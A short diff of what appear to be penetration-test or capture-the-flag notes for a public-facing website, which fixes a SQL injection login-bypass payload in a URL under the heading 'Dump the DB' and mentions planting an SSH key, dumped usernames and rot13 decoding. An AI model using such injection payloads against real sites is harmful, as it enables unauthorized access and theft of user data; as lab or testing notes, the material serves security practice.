@@ -15,7 +15,7 @@ PUBLICFACINGWEBSITE
 #drop a ssh key or dump the DB
 
 	Dump the DB
-		http://ip/login.php?username=bob' OR1-'1&passwd=bob' OR 1='1
+		http://ip/login.php?username=bob' OR1='1&passwd=bob' OR 1='1
 		// dumped usernames
 		// rot13 decode
 
